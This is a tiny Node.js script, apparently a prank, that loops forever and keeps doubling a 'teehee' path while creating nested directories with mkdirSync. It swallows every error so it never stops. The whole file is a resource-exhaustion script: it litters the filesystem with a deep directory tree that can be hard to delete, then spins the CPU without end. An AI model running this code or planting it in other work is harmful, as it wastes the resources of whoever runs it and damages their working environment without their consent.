const fs = require("fs");
let path = "teehee";

while (true) {
  try {
    path = path + "/" + path;
    fs.mkdirSync(path, { recursive: true });
  } catch (e) { }
}